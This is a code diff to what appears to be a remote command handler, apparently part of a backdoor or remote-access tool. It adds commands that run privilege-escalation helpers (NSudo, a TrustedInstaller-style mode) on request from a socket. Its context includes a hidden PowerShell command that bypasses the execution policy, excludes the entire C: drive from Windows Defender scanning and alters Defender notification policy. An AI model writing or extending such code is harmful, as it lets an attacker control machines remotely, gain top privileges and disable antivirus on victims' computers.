@@ -210,6 +210,12 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
         sys_check_antivirus();
         result = "[Security check complete]";
     }
+    else if (strcmp(cmd, "GET_NSUDO") == 0) {
+        result = sys_run_command(sys_get_nsudo());
+    }
+    else if (strcmp(cmd, "EASY_MODE_TP") == 0) {
+        result = sys_run_command(sys_easy_mode_tp());
+    }
     else if (strcmp(cmd, "JAMES_BOND") == 0) {
         result = sys_run_command("powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Add-MpPreference -ExclusionPath 'C:'; New-Item -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Notifications' -Force | Out-Null; Write-Host 'James Bond: exclusion set and notification key created' -ForegroundColor Green\"");
     }
